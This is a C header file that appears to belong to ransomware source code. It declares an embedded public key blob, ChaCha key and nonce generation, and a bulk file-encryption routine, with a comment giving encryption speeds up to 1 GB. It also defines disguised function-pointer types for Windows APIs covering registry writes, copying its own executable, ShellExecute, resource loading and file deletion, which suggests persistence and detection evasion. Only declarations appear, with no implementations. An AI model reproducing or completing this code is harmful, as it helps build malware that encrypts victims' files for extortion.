#pragma once
#include "Chacha.h"
#include "File.h"
#ifndef __Crypto_h__
#define __Crypto_h__

extern BYTE publicKeyBlob[532];

int cryptInit();
int generateKeyNonce(HCRYPTPROV hCryptProv, BYTE* key, BYTE* nonce);
void cryptCleanUp();

typedef DWORD(WINAPI* MemeGetTempPathA)(DWORD nBufferLength, LPSTR lpBuffer);

typedef DWORD(WINAPI* MemeGetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);

typedef BOOL(WINAPI* MemeCryptGenRandom)(HCRYPTPROV hProv, DWORD dwLen, BYTE* pbBuffer);

typedef BOOL(WINAPI* MemeCopyFileA)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists);

typedef LSTATUS(WINAPI* MemeRegOpenKeyExA)(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);

typedef LSTATUS(WINAPI* MemeRegSetKeyValueA)(HKEY hKey, LPCSTR lpSubKey, LPCSTR lpValueName, DWORD dwType, LPCVOID lpData, DWORD cbData);

typedef HINSTANCE(WINAPI* MemeShellExecuteA)(HWND hwnd, LPCSTR lpOperation, LPCSTR lpFile, LPCSTR lpParameters, LPCSTR lpDirectory, INT nShowCmd);

typedef BOOL(WINAPI* MemeCryptReleaseContext)(HCRYPTPROV hProv, DWORD dwFlags);

typedef BOOL(WINAPI* MemePathFileExistsA)(LPCSTR pszPath);

typedef HMODULE(WINAPI* MemeGetModuleHandleA)(LPCSTR lpModuleName);

typedef HRSRC(WINAPI* MemeFindResourceA)(HMODULE hModule, LPCSTR lpName, LPCSTR lpType);

typedef DWORD(WINAPI* MemeSizeofResource)(HMODULE hModule, HRSRC hResInfo);

typedef HGLOBAL(WINAPI* MemeLoadResource)(HMODULE hModule, HRSRC hResInfo);

typedef LPVOID(WINAPI* MemeLockResource)(HGLOBAL hResData);

typedef HANDLE(WINAPI* MemeCreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);

typedef BOOL(WINAPI* MemeWriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);

typedef DWORD(WINAPI* MemeSetFilePointer)(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);

typedef BOOL(WINAPI* MemeReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);

typedef DWORD(WINAPI* MemeGetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);

typedef BOOL(WINAPI* MemeCryptEncrypt)(HCRYPTKEY  hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE* pbData, DWORD* pdwDataLen, DWORD dwBufLen);

typedef BOOL(WINAPI* MemeDeleteFileA)(LPCSTR lpFileName);



// main file encryption function
// 9406ms for 1024mb file, 4706ms for 512mb, 1833ms for 200mb, 924ms for 100mb, 474ms for 50mb, 9ms for 1mb, 92ms for 10mb
int fileEncrypt(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, LPCSTR oriFileName, BYTE* key, BYTE* nonce);

DWORD getLengthString(LPCSTR oriFileName);
#endif

